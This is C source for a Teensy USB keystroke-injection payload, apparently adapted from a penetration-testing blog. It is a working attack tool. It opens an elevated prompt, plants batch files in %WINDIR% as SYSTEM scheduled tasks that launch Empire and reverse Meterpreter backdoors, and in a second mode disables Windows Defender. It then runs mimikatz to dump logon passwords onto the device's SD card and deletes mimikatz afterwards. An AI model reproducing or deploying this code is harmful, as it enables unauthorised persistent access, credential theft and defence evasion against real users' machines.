/*

"Peensy" - that's a Teensy v2.0 with an SD card and 3 pin DIP switch.

This Teensy payload was developed to reliably backdoor Windows systems with powershell installed.
Current payload is an architecture dependent, scheduled reverse meterpreter powershell script - planted in %WINDIR%.
The payload then copies a binary from the Teensy SD, executes it, and copies the resultant file back to the Teensy.

More info can be found in the README and blog post:

http://www.offensive-security.com/offsec/advanced-teensy-penetration-testing-payloads

Modified by exl4

*/

#include <usb_private.h>
#include <SD.h>
#include <SD_t3.h>

const int sd_chip_select = 0; // for Teensy 2.0 SD storage
Sd2Card card;
SdVolume volume;
SdFile root;
SdFile file;

// DIP switch pin initialisation
 unsigned int p1 = 10; 
 unsigned int p2 = 9;
 unsigned int p3 = 8;
 int dipPins[] = {8, 9, 10};

// Teensy has LED on 11
const int led_pin = 11; 

// Wait for Windows to be ready before we start typing.
void wait_for_drivers(unsigned int speed)
{
  bool numLockTrap = is_num_on();
  while(numLockTrap == is_num_on())
  {
    blink_fast(5,80);
    press_numlock();
    unpress_key();
    delay(speed);
  }
  press_numlock();
  unpress_key();
  delay(speed);
}

// NUM, SCROLL, CAPS Led keys checking. We only use NUMLOCK in this sketch. 
int ledkeys(void) {return int(keyboard_leds);}
bool is_scroll_on(void) {return ((ledkeys() & 4) == 4) ? true : false;}
bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}
bool is_num_on(void) {return ((ledkeys() & 1) == 1) ? true : false;}

void unpress_key(void)
{
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);
}

void blink_fast(unsigned int blinkrate,unsigned int delaytime)
{
  unsigned int blinkcounter=0;
  for(blinkcounter=0; blinkcounter!=blinkrate; blinkcounter++)
  {
    digitalWrite(led_pin, HIGH);
    delay(delaytime);
    digitalWrite(led_pin, LOW);
    delay(delaytime);
  }
}

void alt_y(void)
{
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_Y);
  Keyboard.send_now();
  delay(100);
  unpress_key();
}

void alt_f4(void)
{
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_F4);
  Keyboard.send_now();
  delay(100);
  unpress_key();
}

// Attempts to open a UAC enabled prompt (reps) times, with (millisecs) milliseconds between each attempt. 
// Minimal reasonable values are : secure_prompt(3,700);
bool secure_prompt(unsigned int reps, unsigned int millisecs)
{
  make_sure_numlock_is_off();
  delay(700);
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(1500);
  Keyboard.print("cmd.exe");
  delay(1500);
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(200);
  unpress_key();
  delay(1500);
  alt_y();
  delay(1500);
  Keyboard.println(F(""));
  delay(400);
  create_click_numlock_win();
  check_for_numlock_sucess_teensy(reps,millisecs);
}

// A Teensy side check for a pressed numlock key. Will check for a pressed numlock key (reps) times, with (millisecs) milliseconds in between checks.
// The "reps" and millisecs" variables are fed to this function from other functions that require timing. For example:
// check_for_powershell(3,500);  
// download_powershell("http://172.16.1.2/remotefile.exe","localfile.exe",20,1000);
bool check_for_numlock_sucess_teensy(unsigned int reps, unsigned int millisecs)
{
  unsigned int i = 0;
  do
  {
    delay(millisecs);
    if (is_num_on())
    {
      make_sure_numlock_is_off();
      delay(700);
      return true;
    }
    i++;
  }
  while (!is_num_on() && (i<reps));
  return false;
}

// Dumps and executes a vbscript to the Windows File System that programatically presses the NUMLOCK key.
void create_click_numlock_win()
{
  blink_fast(3,80);
  Keyboard.println(F("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{NUMLOCK}\"' > numlock.vbs"));
  delay(400);
  Keyboard.println(F("cscript numlock.vbs"));
  //delay(2000);
}

// Minimises all windows 3 times with (sleep) milliseconds in between. used on failure of CMD opening.
void minimise_windows(void)
{
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_M);
  Keyboard.send_now();
  delay(300);
  unpress_key();
  delay(300);
}

void press_numlock(void)
{
  Keyboard.set_key1(KEY_NUM_LOCK);
  Keyboard.send_now();
  delay(200);
}

void make_sure_numlock_is_off(void)
{
  if (is_num_on())
  {
    delay(500);
    press_numlock();
    delay(200);
    unpress_key();
    delay(700);
  }
}


// Preforms a Windows copy operation from the attached FAT formatted SD drive to the target machine. The drive VOLUME NAME is also taken as a parameter. For example:
// wincopy_from_sd_card("hstart64.exe" ,"hstart.exe","PAYLOAD");
// Presses numlock on success. Can only be used when the Teensy is loaded as a "Disk (SD Card) + Keyboard"
bool wincopy_from_sd_card(char *source,char *destination, char *volumename, unsigned int reps, unsigned int millisecs)
{
  delay(200);
  make_sure_numlock_is_off();
  Keyboard.print(F("for /F \%i in ('WMIC logicaldisk where \"DriveType=2\" list brief ^| find \""));
  Keyboard.print(volumename);
  Keyboard.print(F("\"') do copy /Y \%i\\"));
  Keyboard.print(source);
  Keyboard.print(" ");
  Keyboard.println(destination);
  delay(200);
  Keyboard.println(F("cscript numlock.vbs"));
  delay(700);
  return check_for_numlock_sucess_teensy(reps,millisecs);
}

// Preforms a Windows copy operation from the target machine to the attached FAT formatted SD drive. The drive VOLUME NAME is also taken as a parameter. For example:
// wincopy_from_sd_card("c:\\windows\\file.exe" ,"loot.exe","PAYLOAD");
// Presses numlock on success. Can only be used when the Teensy is loaded as a "Disk (SD Card) + Keyboard"
bool wincopy_to_sd_card(char *source,char *destination, char *volumename, unsigned int reps, unsigned int millisecs)
{
  delay(200);
  make_sure_numlock_is_off();
  Keyboard.print(F("for /F \%i in ('WMIC logicaldisk where \"DriveType=2\" list brief ^| find \""));
  Keyboard.print(volumename);
  Keyboard.print(F("\"') do copy /Y "));
  Keyboard.print(source);
  Keyboard.print(F(" \%i\\"));
  Keyboard.println(destination);
  delay(200);
  delay(700);
  Keyboard.println(F("cscript numlock.vbs"));
  delay(700);
  return check_for_numlock_sucess_teensy(reps,millisecs);
}

// returns 1 on successful Teensy SD card init. 
bool init_sd_card(void) { return (card.init(SPI_HALF_SPEED, sd_chip_select) && volume.init(&card) && root.openRoot(&volume)) ? true : false;}

// A function to check if Windows has mounted a drive with VOLUMENAME.
// Presses numlock on success.
// Minimal reasonable values depend on file size and USB speed. For a small file: win_check_sd_card_mounted_powershell(4,700);
// Presses numlock on success. Can only be used when the Teensy is loaded as a "Disk (SD Card) + Keyboard"
bool win_check_sd_card_mounted_powershell(char *volumename, unsigned int reps, unsigned int millisecs)
{
  delay(200);
  make_sure_numlock_is_off();
  delay(400);
  Keyboard.println(F("powershell"));
  delay(5000);
  Keyboard.print(F("if (Get-WmiObject -Class Win32_LogicalDisk | Where-Object {($_.DriveType -eq 2) -and ($_.VolumeName -eq \""));
  Keyboard.print(volumename);
  Keyboard.println(F("\")}) {Write-host hola;$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{NUMLOCK}')}"));
  delay(500);
  Keyboard.println(F("exit"));
  delay(500);
  return check_for_numlock_sucess_teensy(reps,millisecs);
}  

// Initialise the DIP switch pins.
void init_dip_switch(void)
{
  pinMode(p1, INPUT_PULLUP);
  pinMode(p2, INPUT_PULLUP);
  pinMode(p3, INPUT_PULLUP);
}

//Read state from DIP Switch
byte address()
{
  int i,j=0;
 
  //Get the switches state
   for(i=0; i<=2; i++)
   {
     j = (j << 1) | digitalRead(dipPins[i]);   // read each input pin
   }
   return j; //return address
}

void initVictim(void)
{
  if (!init_sd_card()){Serial.println("SDCARD FAIL");}

  wait_for_drivers(2000);
  // delay(2000);
  // minimise_windows();
  delay(200);
  secure_prompt(3,500);
  /*
  while (!secure_prompt(3,500))
  {
    reset_windows_desktop(2000);
  }
  */
  delay(500);
}

void toggleDefender(void)
{
  // make_sure_numlock_is_off();
  // delay(700);
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(1500);
  Keyboard.print("Windows Defender Settings");
  delay(1500);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(200);
  unpress_key();
  delay(200);
  Keyboard.set_key1(KEY_TAB);
  Keyboard.send_now();
  delay(200);
  unpress_key();
  delay(200);
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();
  delay(200);
  unpress_key();
  delay(200);
  alt_f4();
}

void performMimikatz(void)
{
  delay(300);
  Keyboard.println(F("powershell"));
  delay(700);

  // For loop to find drive letter
  Keyboard.println(F("$letter = Get-WmiObject Win32_Volume -Filter \"Label='PEENSY'\" | select -expand driveletter"));
  
  // extract the exe
  Keyboard.println(F("$shell = new-object -com shell.application"));
  Keyboard.println(F("$zip = $shell.NameSpace(\"$letter\\mimikatz.zip\")"));
  Keyboard.println(F("foreach($item in $zip.items())"));
  delay(200);
  Keyboard.println(F("{"));
  delay(200);
  Keyboard.println(F("$shell.Namespace($env:temp).copyhere($item)"));
  delay(200);
  Keyboard.println(F("}"));  
  delay(700);

  // Start mimikatz
  Keyboard.println(F("Invoke-Expression \"$env:temp\\mimikatz.exe\""));
  delay(700);

  // Dump contents to file
  Keyboard.println(F("privilege::debug"));
  delay(200);
  
  Keyboard.println(F("log \"C:\\other.log\""));
  delay(200);

  Keyboard.println(F("sekurlsa::logonpasswords"));
  delay(1000);
  
  Keyboard.println(F("exit"));
  delay(700);
  
  // Move file to SD card with date
  Keyboard.println(F("Move-Item \"C:\\other.log\" \"$letter\\pwn$((get-date).tostring(\"MMddyyyyHHmmss\")).txt\""));
  delay(200);
  
  // Delete mimimkatz 
  Keyboard.println(F("Remove-Item \"$env:temp\\mimikatz.exe\""));
  delay(200);

  // Exit Powershell
  Keyboard.println(F("exit"));
  delay(200);
}

// Main body of execution
void setup(void)
{
  Serial.begin(9600);
  // blink_fast(10,80);
  // delay(1000);

  // init_dip_switch();

  //init and read dip switch positions
  int i;
  for(i = 0; i<=2; i++)
  {
    pinMode(dipPins[i], INPUT_PULLUP);     
  }

  int dipSwitchPos = address();

  if (digitalRead(p3) && digitalRead(p2) && !digitalRead(p1)) 
  //if (dipSwitchPos == 110)
  {
    initVictim();

    // startEmpire
    wincopy_from_sd_card("PE.bat" ,"%WINDIR%\\PE.bat","PEENSY",3,200);
    //delay(700);
    Keyboard.println(F(""));
    Keyboard.println(F("schtasks /create /ru SYSTEM /sc HOURLY /MO 12 /tn Diag /tr \"'cmd' /c start '' '%WINDIR%\\PE.bat'\""));
    delay(300);
    Keyboard.println(F("schtasks /run /tn Diag"));

    // start meterpreter
    wincopy_from_sd_card("msf.bat" ,"%WINDIR%\\msf.bat","PEENSY",3,200);
    //delay(700);
    Keyboard.println(F(""));
    Keyboard.println(F("schtasks /create /ru SYSTEM /sc HOURLY /MO 12 /tn Maint /tr \"'cmd' /c start '' '%WINDIR%\\msf.bat'\""));
    delay(300);
    Keyboard.println(F("schtasks /run /tn Maint"));

    alt_f4();
  }

  if (digitalRead(p3) && !digitalRead(p2) && digitalRead(p1))  
  {
    initVictim();
    toggleDefender();
    performMimikatz(); 
    alt_f4();
    toggleDefender();
  }

  //if (!digitalRead(p3)) 
  //{
    // Do mac payload...
  //}

  // Blink light to show finished running
  blink_fast(150,30);
}

void loop(void){}













